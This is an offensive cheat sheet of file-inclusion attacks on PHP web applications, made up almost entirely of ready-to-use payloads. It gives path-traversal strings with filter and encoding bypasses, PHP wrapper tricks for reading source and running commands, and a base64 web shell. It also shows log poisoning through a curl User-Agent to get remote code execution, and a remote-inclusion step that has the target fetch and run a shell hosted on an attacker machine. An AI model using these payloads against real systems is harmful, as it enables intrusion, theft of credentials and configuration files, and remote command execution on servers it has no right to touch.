# File Inclusion (LFI / RFI)

## LFI — Path Traversal

```bash
../../../../etc/passwd
....//....//....//etc/passwd             # bypass basic filter
..%252f..%252f..%252fetc/passwd          # double URL encoding
```

## PHP Wrappers

```bash
# Read PHP source code (base64)
php://filter/convert.base64-encode/resource=config.php

# Execute code via php://input
php://input    # POST body: <?php system('whoami'); ?>

# Execute via data://
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

## Log Poisoning (LFI → RCE)

```bash
# 1. Inject PHP into access log via User-Agent
curl http://TARGET -A "<?php system(\$_GET['cmd']); ?>"

# 2. Include the log with a command
?page=../../../../var/log/apache2/access.log&cmd=whoami
```

## RFI

```bash
# Host shell on Kali: echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server 80
?page=http://KALI/shell.php&cmd=whoami
```

## Windows LFI Paths

```
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\inetpub\wwwroot\web.config
```
